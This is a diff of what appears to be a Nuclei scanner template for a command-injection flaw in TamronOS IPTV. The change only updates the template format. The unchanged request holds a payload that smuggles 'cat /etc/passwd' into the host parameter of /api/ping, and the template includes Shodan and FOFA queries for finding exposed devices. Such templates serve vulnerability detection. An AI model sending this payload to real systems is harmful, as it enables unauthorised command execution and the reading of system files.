@@ -13,12 +13,13 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-78
   metadata:
+    max-request: 1
     verified: true
     shodan-query: title:"TamronOS IPTV系统"
     fofa-query: title="TamronOS IPTV系统"
   tags: tamronos,rce
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp"
